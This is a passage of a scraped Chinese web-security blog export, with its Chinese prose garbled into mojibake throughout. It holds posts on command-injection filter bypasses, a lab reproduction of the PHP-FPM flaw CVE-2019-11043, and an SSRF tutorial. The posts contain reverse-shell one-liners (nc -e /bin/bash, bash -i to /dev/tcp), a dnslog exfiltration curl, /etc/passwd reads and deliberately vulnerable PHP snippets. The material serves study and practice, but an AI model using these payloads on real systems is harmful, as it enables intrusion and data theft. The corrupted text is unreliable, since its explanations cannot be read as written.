¼ä½œä¸ºåˆ†éš”ç¬¦ï¼Œæœ‰äº›æ—¶å€™é‡åˆ°åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ä¹Ÿä¼šè¿›è¡Œåˆ†éš”ã€‚æœ€å…¸å‹çš„æ˜¯â€for i in a b câ€œï¼Œå®ƒä¼šåˆ†å‰²å˜é‡åˆ—è¡¨â€a b câ€ä½¿å…¶æˆä¸ºä¸‰ä¸ªå˜é‡ã€‚è¿™ç§åˆ†éš”ç¬¦æ˜¯ç”±IFSå˜é‡æŒ‡å®šçš„ &emsp;&emsp;é»˜è®¤çš„IFSåœ¨ç¢°åˆ°ç©ºæ ¼ã€åˆ¶è¡¨ç¬¦\\tå’Œåˆ†è¡Œç¬¦\\nå°±ä¼šè‡ªåŠ¨åˆ†éš”è¿›å…¥ä¸‹ä¸€æ­¥ã€‚ä½†æ˜¯å¯¹ç©ºæ ¼å¤„ç†æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œå¯¹è¡Œé¦–å’Œè¡Œå°¾ä¸¤è¾¹çš„ç©ºæ ¼ä¸å¤„ç†ï¼Œå¹¶ä¸”å¤šä¸ªè¿ç»­çš„ç©ºæ ¼é»˜è®¤å½“ä½œä¸€ä¸ªç©ºæ ¼ cat$&#123;IFS&#125;/etc/passwd bã€$IFS$9&emsp;&emsp;$9æŒ‡ä¼ è¿‡æ¥çš„ç¬¬9ä¸ªå‚æ•° kali@kali: cat$IFS$9flagyou are good!kali@kali: cat$IFS$1flagyou are good! cã€%20ã€%09(tab)ï¼ˆéœ€è¦PHPç¯å¢ƒï¼Œä¸æ¼”ç¤ºï¼‰dã€&lt;æˆ–è€…&lt;&gt;é‡å®šå‘kali@kali: cat&lt;flagyou are good!kali@kali: cat&lt;&gt;flagyou are good! ï¼ˆ7ï¼‰ncåå¼¹shellnc -e /bin/bash 192.168.0.104 3456 &emsp;&emsp;ä¸ºäº†é¿å…ç¬¦å·ï¼Œå¯ä»¥å°†IPåœ°å€è½¬æ¢æˆæ•´å‹ï¼šnc -e /bin/bash 3232235624 3456 &emsp;&emsp;ä½¿ç”¨é€šé…ç¬¦ï¼š /??n/?c -e /??n/b??h 3232235624 3456 &emsp;&emsp;æˆ–è€… é»‘å®¢ï¼šnc -lvv 8888é¶æœºï¼š?cmd=bash -i &gt;&amp; /dev/tcp/x.x.x.x/8888 0&gt;&amp;1 [+] bash -iï¼Œæ„ä¸ºåˆ›å»ºä¸€ä¸ªäº¤äº’å¼çš„bash shell [+] 0ï¼ŒSTDIN_FILENOï¼Œæ ‡å‡†è¾“å…¥ï¼ˆä¸€èˆ¬æ˜¯é”®ç›˜ï¼‰ 1ï¼ŒSTDOUT_FILENOï¼Œæ ‡å‡†è¾“å‡ºï¼ˆä¸€èˆ¬æ˜¯æ˜¾ç¤ºå±ï¼Œå‡†ç¡®çš„è¯´æ˜¯ç”¨æˆ·ç»ˆç«¯æ§åˆ¶å°ï¼‰ 2ï¼ŒSTDERR_FILENOï¼Œæ ‡å‡†é”™è¯¯ï¼ˆå‡ºé”™ä¿¡æ¯è¾“å‡ºï¼‰ 1&gt;ï¼Œåªå†™&gt;è€Œçœç•¥ä¸å†™æ•°å­—åˆ™é»˜è®¤å°±æ˜¯ 1 åŒç†ï¼Œè¾“å…¥é‡å®šå‘0&lt;çœç•¥ä¸å†™åˆ™é»˜è®¤å°±æ˜¯ 0 [+] 2&gt;&amp;1&amp;çš„æ„ä¹‰ï¼Œç”¨æ¥å°†æ ‡å‡†é”™è¯¯2é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º1ä¸­çš„ã€‚æ­¤å¤„1å‰é¢çš„&amp;å°±æ˜¯ä¸ºäº†è®©bashå°†1è§£é‡Šæˆæ ‡å‡†è¾“å‡ºè€Œä¸æ˜¯æ–‡ä»¶1ã€‚è‡³äºæœ€åä¸€ä¸ª&amp;ï¼Œåˆ™æ˜¯è®©bashåœ¨åå°æ‰§è¡Œã€‚ [+] /dev/tcp/192.168.1.1/8888ï¼Œè¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šæ–‡ä»¶ï¼Œå®ƒä¼šå»ºç«‹ä¸€ä¸ªè¿æ¥åˆ°192.168.1.1:8888çš„socketæ„æ€å°±æ˜¯ï¼šbash -iåˆ›å»ºä¸€ä¸ªäº¤äº’å¼çš„bashï¼Œ&amp;&gt;å°†bashçš„æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°/dev/tcp/192.168.1.1/9090çš„socketè¿æ¥ä¸Šï¼Œ0&gt;&amp;1å°†æ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œæœ€ç»ˆçš„ç»“æœå°±æ˜¯æ ‡å‡†è¾“å…¥ä¹Ÿè¢«é‡å®šå‘åˆ°äº†TCPè¿æ¥ä¸­ï¼Œå› æ­¤è¾“å…¥å’Œè¾“å‡ºéƒ½å¯ä»¥åœ¨å…¬ç½‘ä¸»æœºä¸Šè¿›è¡Œï¼Œé€šè¿‡TCPè¿æ¥å’Œbashè¿›è¡Œäº¤äº’ã€‚ å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/Auuuuuuuu/article/details/89059176 ï¼ˆ8ï¼‰ä½¿ç”¨æœªåˆå§‹åŒ–çš„bashå˜é‡&emsp;&emsp;åœ¨bashç¯å¢ƒä¸­å…è®¸æˆ‘ä»¬ä½¿ç”¨æœªåˆå§‹åŒ–çš„bashå˜é‡ï¼Œæ¯”å¦‚ $a,$b,$c æˆ‘ä»¬äº‹å…ˆå¹¶æ²¡æœ‰å®šä¹‰å®ƒä»¬ï¼Œè¾“å‡ºçœ‹çœ‹: root@kali:~# echo $aroot@kali:~# echo $broot@kali:~# echo $croot@kali:~# &emsp;&emsp;æœªåˆå§‹åŒ–çš„å˜é‡å€¼éƒ½æ˜¯Null &emsp;&emsp;è¯»å–/etc/passwdï¼š cat$a /etc$a/passwd$a &emsp;&emsp;æµ‹è¯•WAFï¼š &lt;?phpecho &quot;OK&quot;;system(&#x27;dig&#x27;.$_GET[&#x27;host&#x27;]);?&gt; &emsp;&emsp;whichæŒ‡ä»¤ä¼šåœ¨ç¯å¢ƒå˜é‡$PATHè®¾ç½®çš„ç›®å½•é‡ŒæŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ ï¼Œå…ˆæ‰¾å‡ºncæ–‡ä»¶è·¯å¾„ï¼šwww.baidu.com;$s/bin$s/which$s nc$s &emsp;&emsp;çŸ¥é“ncåœ¨å“ªé‡Œäº†ï¼Œåå¼¹shellï¼šwww.baidu.com;/bin$s/nc$s -e/bin$s/bash$s 3232235624 3456ï¼Œ-eåé¢æœ‰æ²¡æœ‰ç©ºæ ¼éƒ½å¯ä»¥ 2ã€æœ‰çš„æ–‡ä»¶æ— æ³•æ‰§è¡Œ&emsp;&emsp;å…ˆèµ‹äºˆæ‰§è¡Œæƒé™å†è¿è¡Œ chm&#x27;o&#x27;d 777 ./key.phpchm\\o\\d 777 ./key.php 3ã€ç›´æ¥è¯»å–æ–‡ä»¶127.0.0.1;curl file:///etc/passwd 4ã€åˆ©ç”¨dnslogæˆ–è€…http web logls | curl xxx.ceye.io/whoami`` 5ã€ç»•è¿‡é•¿åº¦é™åˆ¶ï¼ˆ1ï¼‰&gt;å’Œ&gt;&gt;&emsp;&emsp;ä½¿ç”¨&gt;å‘½ä»¤ä¼šå°†åŸæœ‰æ–‡ä»¶å†…å®¹è¦†ç›–ï¼Œå¦‚æœæ˜¯å­˜å…¥ä¸å­˜åœ¨çš„æ–‡ä»¶åï¼Œé‚£ä¹ˆå°±ä¼šæ–°å»ºæ–‡ä»¶å†å­˜å…¥ &emsp;&emsp;&gt;&gt;ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹ ï¼ˆ2ï¼‰å‘½ä»¤æ¢è¡Œ&emsp;&emsp;æ¢è¡Œæ‰§è¡Œå‘½ä»¤ kali@kali:~/æ¡Œé¢$ ca\\&gt; t\\&gt; fl\\&gt; agyou are good! &emsp;&emsp;å¯ä»¥å°è¯•å†™ä¸€ä¸ªæ–‡ä»¶æ¥æ‰§è¡Œå‘½ä»¤ kali@kali: echo &quot;ca\\\\&quot;&gt;shellkali@kali: echo &quot;t\\\\&quot;&gt;&gt;shellkali@kali: echo &quot; fl\\\\&quot;&gt;&gt;shellkali@kali: echo &quot;ag&quot;&gt;&gt;shellkali@kali: cat shellca\\t\\ fl\\agkali@kali: sh shellyou are good! 6ã€å†…æ•›æ‰§è¡Œç»•è¿‡&emsp;&emsp;å‘½ä»¤å’Œ$(å‘½ä»¤)éƒ½æ˜¯æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ &emsp;&emsp;ä¾‹å­ kali@kali: echo &quot;m0re`cat flag`&quot;m0reyou are good!kali@kali: echo &quot;m0re $(cat flag)&quot;m0re you are good!kali@kali: echo &quot;m0re $(pwd)&quot;m0re /root å››ã€æ¶‰åŠèµ„æº JAVA webç½‘ç«™ä»£ç å®¡è®¡ï¼ï¼å…¥é—¨ PHP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2019-11043ï¼‰ å¢¨è€…é¶åœºâ€”â€”PHPä»£ç åˆ†ææº¯æº(ç¬¬4é¢˜) å¢¨è€…é¶åœºâ€”â€”å‘½ä»¤æ³¨å…¥æ‰§è¡Œåˆ†æ å¢¨è€…é¶åœºâ€”â€”Webminæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"RCE","slug":"RCE","permalink":"https://wolke.cn/tags/RCE/"}],"author":"w01ke"},{"title":"CVE-2019-11043ï¼ˆPHPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰","slug":"CVE-2019-11043ï¼ˆPHPè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰","date":"2022-02-12T15:06:40.000Z","updated":"2022-03-09T04:43:25.606Z","comments":true,"path":"post/4f87817f.html","link":"","permalink":"https://wolke.cn/post/4f87817f.html","excerpt":"","text":"ä¸€ã€æ¼æ´æè¿°&emsp;&emsp;CVE-2019-11043 æ˜¯ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä½¿ç”¨æŸäº›ç‰¹å®šé…ç½®çš„ Nginx + PHP-FPM çš„æœåŠ¡å™¨å­˜åœ¨æ¼æ´ï¼Œå¯å…è®¸æ”»å‡»è€…è¿œç¨‹æ‰§è¡Œä»£ç ã€‚ &emsp;&emsp;å‘Nginx + PHP-FPMçš„æœåŠ¡å™¨ URLå‘é€ %0a æ—¶ï¼ŒæœåŠ¡å™¨è¿”å›å¼‚å¸¸ã€‚ &emsp;&emsp;è¯¥æ¼æ´éœ€è¦åœ¨nginx.confä¸­è¿›è¡Œç‰¹å®šé…ç½®æ‰èƒ½è§¦å‘ã€‚å…·ä½“é…ç½®å¦‚ä¸‹ï¼š location ~ [^/]\\.php(/|$) &#123; ... fastcgi_split_path_info ^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... &#125; &emsp;&emsp;æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ¢è¡Œç¬¦ï¼ˆï¼…0aï¼‰æ¥ç ´åfastcgi_split_path_infoæŒ‡ä»¤ä¸­çš„Regexpã€‚ Regexpè¢«æŸåå¯¼è‡´PATH_INFOä¸ºç©ºï¼Œä»è€Œè§¦å‘è¯¥æ¼æ´ã€‚ äºŒã€å½±å“èŒƒå›´&emsp;&emsp;åœ¨ Nginx + PHP-FPM ç¯å¢ƒä¸‹ï¼Œå½“å¯ç”¨äº†ä¸Šè¿° Nginx é…ç½®åï¼Œä»¥ä¸‹ PHP ç‰ˆæœ¬å—æœ¬æ¬¡æ¼æ´å½±å“ï¼Œå¦å¤–ï¼ŒPHP 5.6ç‰ˆæœ¬ä¹Ÿå—æ­¤æ¼æ´å½±å“ï¼Œä½†ç›®å‰åªèƒ½ Crashï¼Œä¸å¯ä»¥è¿œç¨‹ä»£ç æ‰§è¡Œï¼š â— PHP 7.0 ç‰ˆæœ¬ â— PHP 7.1 ç‰ˆæœ¬ â— PHP 7.2 ç‰ˆæœ¬ â— PHP 7.3 ç‰ˆæœ¬ ä¸‰ã€æ¼æ´å¤ç°&emsp;&emsp;ä½¿ç”¨ P ç‰›çš„ docker ç¯å¢ƒè¿›è¡Œå¤ç°ï¼š &emsp;&emsp;PHP-FPM è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-11043ï¼‰ 1ã€å®‰è£…dockerã€golangç¯å¢ƒsudo apt-get install docker docker-composesudo apt install golang 2ã€æ­å»ºæ¼æ´ç¯å¢ƒgit clone https://github.com/vulhub/vulhub.gitcd vulhub/php/CVE-2019-11043 &amp;&amp; docker-compose up -d â€‹ &emsp;&emsp;å¯åŠ¨ç¯å¢ƒä¹‹åï¼Œå°±å¯ä»¥çœ‹åˆ°æ¼æ´ç¯å¢ƒçš„é»˜è®¤é¡µé¢ã€‚åœ¨æ­¤ä¸ºhttp://127.0.0.1:8080/index.php 3ã€å®‰è£…æ¼æ´åˆ©ç”¨å·¥å…·git clone https://github.com/neex/phuip-fpizdam.gitcd phuip-fpizdamgo get -v &amp;&amp; go build &emsp;&emsp;æŠ¥é”™åŸå› ï¼šé»˜è®¤ä½¿ç”¨çš„æ˜¯proxy.golang.orgï¼Œåœ¨å›½å†…æ— æ³•è®¿é—® &emsp;&emsp;æ¢ä¸€ä¸ªå›½å†…èƒ½è®¿é—®çš„ä»£ç†åœ°å€ï¼šhttps://goproxy.cnã€‚é‡æ–°æ‰§è¡Œå‘½ä»¤å³å¯ go env -w GOPROXY=https://goproxy.cngo get -v &amp;&amp; go build 4ã€æ¼æ´åˆ©ç”¨go run . &quot;http://127.0.0.1:8080/index.php&quot; &emsp;&emsp;è®¿é—®http://127.0.0.1/index.php?a=id æ³¨æ„ï¼Œå› ä¸ºphp-fpmä¼šå¯åŠ¨å¤šä¸ªå­è¿›ç¨‹ï¼Œåœ¨è®¿é—®/index.php?a=idæ—¶éœ€è¦å¤šè®¿é—®å‡ æ¬¡ï¼Œä»¥è®¿é—®åˆ°è¢«æ±¡æŸ“çš„è¿›ç¨‹ã€‚ curl ip.sbä¸ºLinuxä¸­æŸ¥è¯¢å…¬ç½‘IPçš„å‘½ä»¤ å››ã€å‚è€ƒé“¾æ¥ https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md https://github.com/neex/phuip-fpizdam http://blog.leanote.com/post/snowming/9da184ef24bd","categories":[{"name":"æ¼æ´åˆ†æ","slug":"æ¼æ´åˆ†æ","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://wolke.cn/tags/CVE/"},{"name":"ä¸­é—´ä»¶","slug":"ä¸­é—´ä»¶","permalink":"https://wolke.cn/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"}],"author":"w01ke"},{"title":"SSRFæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»","slug":"SSRFæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ”»å‡»","date":"2022-02-07T14:49:10.000Z","updated":"2022-02-11T10:19:22.319Z","comments":true,"path":"post/98624e3.html","link":"","permalink":"https://wolke.cn/post/98624e3.html","excerpt":"","text":"ä¸€ã€SSRFæ¦‚è¿°&emsp;&emsp;SSRF(Server-Side Request Forgeryï¼šæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )ï¼Œæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„å®‰å…¨æ¼æ´ã€‚ &emsp;&emsp;å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚ï¼Œå¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ® &emsp;&emsp;æ•°æ®æµï¼šæ”»å‡»è€…â€”â€“&gt;æœåŠ¡å™¨â€”â€“&gt;ç›®æ ‡åœ°å€ &emsp;&emsp;æ ¹æ®åå°ä½¿ç”¨å‡½æ•°çš„ä¸åŒï¼Œå¯¹åº”çš„å½±å“å’Œåˆ©ç”¨æ–¹æ³•åˆæœ‰ä¸ä¸€æ · &emsp;&emsp;PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF: file_get_contents()fsockopen()curl_exec() &emsp;&emsp;å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š(â€œæˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚â€)çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚ï¼Œåˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤ã€‚ &emsp;&emsp;ä½ å¯ä»¥æ ¹æ®â€œSSRFâ€é‡Œé¢çš„é¡¹ç›®æ¥ææ‡‚é—®é¢˜çš„åŸå›  äºŒã€åŸç†&emsp;&emsp;å¾ˆå¤šWebåº”ç”¨éƒ½æä¾›äº†ä»å…¶ä»–çš„æœåŠ¡å™¨ä¸Šè·å–æ•°æ®çš„åŠŸèƒ½ï¼Œæ ¹æ®ç”¨æˆ·æŒ‡å®šçš„URLï¼ŒWebåº”ç”¨ä¾¿å¯ä»¥è·å–å›¾ç‰‡ï¼Œä¸‹è½½æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚SSRFçš„å®è´¨æ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„Webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼Œé»‘å®¢å¯ä»¥åˆ©ç”¨SSRFæ¼æ´è·å–å†…éƒ¨ç³»ç»Ÿçš„ä¸€äº›ä¿¡æ¯ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚SSRFå½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚ ä¸‰ã€åˆ©ç”¨SSRFå¯ä»¥å®ç°çš„æ”»å‡»&emsp;&emsp;æ”»å‡»è€…æƒ³è¦è®¿é—®ä¸»æœºBä¸Šçš„æœåŠ¡ï¼Œä½†æ˜¯ç”±äºå­˜åœ¨é˜²ç«å¢™æˆ–è€…ä¸»æœºBæ˜¯å±äºå†…ç½‘ä¸»æœºç­‰åŸå› å¯¼è‡´æ”»å‡»è€…æ— æ³•ç›´æ¥è®¿é—®ä¸»æœºBã€‚è€ŒæœåŠ¡å™¨Aå­˜åœ¨SSRFæ¼æ´ï¼Œè¿™æ—¶æ”»å‡»è€…å¯ä»¥å€ŸåŠ©æœåŠ¡å™¨Aæ¥å‘èµ·SSRFæ”»å‡»ï¼Œé€šè¿‡æœåŠ¡å™¨Aå‘ä¸»æœºBå‘èµ·è¯·æ±‚ï¼Œä»è€Œè·å–ä¸»æœºBçš„ä¸€äº›ä¿¡æ¯ã€‚ å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨çš„å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„Bannerä¿¡æ¯ æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº å¯¹å†…ç½‘Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯ æ”»å‡»å†…å¤–ç½‘çš„Webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨GETè¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆæ¯”å¦‚: Struts2ã€ sqliï¼‰ ä¸‹è½½å†…ç½‘èµ„æº(å¦‚ï¼šåˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰) è¿›è¡Œè·³æ¿ æ— è§†cdn åˆ©ç”¨Redisæœªæˆæƒè®¿é—®ï¼ŒHTTP CRLFæ³¨å…¥å®ç°getshell å››ã€SSRFæ¼æ´ç›¸å…³å‡½æ•°å’Œåè®®1ã€PHPå‡½æ•°&emsp;&emsp;file_get_contents()ã€fsockopen()ã€curl_exec()ã€fopen()ã€readfile()ç­‰å‡½æ•°ä½¿ç”¨ä¸å½“ä¼šé€ æˆSSRFæ¼æ´ ï¼ˆ1ï¼‰file_get_contents()&emsp;&emsp;file_get_contentså‡½æ•°ä»ç”¨æˆ·æŒ‡å®šçš„urlè·å–å†…å®¹ï¼Œç„¶åæŒ‡å®šä¸€ä¸ªæ–‡ä»¶åè¿›è¡Œä¿å­˜ï¼Œå¹¶å±•ç¤ºç»™ç”¨æˆ·ã€‚file_put_contentså‡½æ•°æŠŠä¸€ä¸ªå­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶ä¸­ã€‚ &emsp;&emsp;æ¯”å¦‚ä»¥ä¸‹ä»£ç åœ¨Win10ä¸Šéƒ¨ç½²ï¼Œè¿™æ®µä»£ç ä½¿ç”¨file_get_contents()å‡½æ•°ä»ç”¨æˆ·æŒ‡å®šçš„URLè·å–å›¾ç‰‡å¹¶å±•ç¤ºç»™ç”¨æˆ·ã€‚å’ŒWin10åŒä¸€å†…ç½‘çš„Kaliåœ¨8000ç«¯å£æœåŠ¡å¼€å¯äº†åªä¾›å†…éƒ¨äººå‘˜ä½¿ç”¨çš„èµ„æ–™æ¯”å¦‚ssrf_flagï¼Œæ­¤æ—¶å¦‚æœæ”»å‡»è€…æäº¤å¦‚ä¸‹Payloadï¼Œå°±å¯ä»¥è·å–åˆ°å†…ç½‘ä¸»æœºHTTPæœåŠ¡8000ç«¯å£çš„å¼€æ”¾æƒ…å†µ &lt;?php $url = $_GET[&#x27;url&#x27;]; echo file_get_contents($url);?&gt; ï¼ˆ2ï¼‰fsockopen()&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo &quot;$errstr (error number $errno) \\n&quot;; &#125; else &#123; $out = &quot;GET $link HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; $out .= &quot;\\r\\n&quot;; fwrite($fp, $out); $contents=&#x27;&#x27;; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt;fsockopenå‡½æ•°å®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ï¼Œè¯¥å‡½æ•°ä½¿ç”¨socketï¼ˆç«¯å£ï¼‰è·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“æ•°æ®ã€‚å˜é‡hostä¸ºä¸»æœºåï¼Œportä¸ºç«¯å£ï¼Œerrstrè¡¨ç¤ºé”™è¯¯ä¿¡æ¯å°†ä»¥å­—ç¬¦ä¸²çš„ä¿¡æ¯è¿”å›ï¼Œ30ä¸ºæ—¶é™ ï¼ˆ3ï¼‰curl_exec()&lt;?php if (isset($_POST[&#x27;url&#x27;]))&#123; $link = $_POST[&#x27;url&#x27;]; $curlobj = curl_init();// åˆ›å»ºæ–°çš„ cURL èµ„æº curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// è®¾ç½® URL å’Œç›¸åº”çš„é€‰é¡¹ $result=curl_exec($curlobj);// æŠ“å– URL å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨ curl_close($curlobj);// å…³é—­ cURL èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;; file_put_contents($filename, $result); echo $result;&#125;?&gt;curl_execå‡½æ•°ç”¨äºæ‰§è¡ŒæŒ‡å®šçš„cURLä¼šè¯ ï¼ˆ4ï¼‰æ³¨æ„1. ä¸€èˆ¬æƒ…å†µä¸‹PHPä¸ä¼šå¼€å¯fopençš„gopher wrapper2. file_get_contentsçš„gopheråè®®ä¸èƒ½URLç¼–ç 3. file_get_contentså…³äºGopherçš„302è·³è½¬ä¼šå‡ºç°bugï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥4. curl/libcurl 7.43 ä¸Šgopheråè®®å­˜åœ¨bug(%00æˆªæ–­) ç»æµ‹è¯•7.49 å¯ç”¨5. curl_exec() //é»˜è®¤ä¸è·Ÿè¸ªè·³è½¬6. file_get_contents() // file_get_contentsæ”¯æŒphp://inputåè®® 2ã€åè®®ï¼ˆ1ï¼‰file&emsp;&emsp;åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„å†…å®¹ file:///etc/passwdfile:///etc/apache2/apache2.conf ï¼ˆ2ï¼‰dict&emsp;&emsp;æ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘RedisæœåŠ¡ç­‰ dict://192.168.15.111:22 //è¯»å–æœ¬åœ°æœåŠ¡å™¨22ç«¯å£ä¿¡æ¯dict://dict://192.168.15.51:22 //è¯»å–å’Œæœ¬åœ°æœåŠ¡å™¨ç›¸é€šçš„æœåŠ¡å™¨22ç«¯å£ä¿¡æ¯ ï¼ˆ3ï¼‰Gopher&emsp;&emsp;Gopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆGopheråè®®çš„è¯·æ±‚ã€‚Gopheråè®®æ˜¯SSRFåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®ï¼ˆä¿—ç§°ä¸‡èƒ½åè®®ï¼‰ã€‚å¯ç”¨äºåå¼¹shell ï¼ˆ4ï¼‰http/s&emsp;&emsp;æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´» äº”ã€å®¹æ˜“å‡ºç°SSRFæ¼æ´çš„åœ°æ–¹ï¼ˆ1ï¼‰ä»WEBåŠŸèƒ½ä¸Šå¯»æ‰¾ åˆ†äº«ï¼šé€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹ è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ åœ¨çº¿ç¿»è¯‘ï¼šé€šè¿‡URLåœ°å€ç¿»è¯‘å¯¹åº”æ–‡æœ¬çš„å†…å®¹ã€‚æä¾›æ­¤åŠŸèƒ½çš„å›½å†…å…¬å¸æœ‰ç™¾åº¦ã€æœ‰é“ç­‰ å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡ å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½ æœªå…¬å¼€çš„apiå®ç° ç½‘ç«™é‡‡é›†ã€ç½‘é¡µæŠ“å–çš„åœ°æ–¹ã€‚ å¤´åƒçš„åœ°æ–¹ã€‚(è¿œç¨‹åŠ è½½å¤´åƒ) ä¸€åˆ‡è¦ä½ 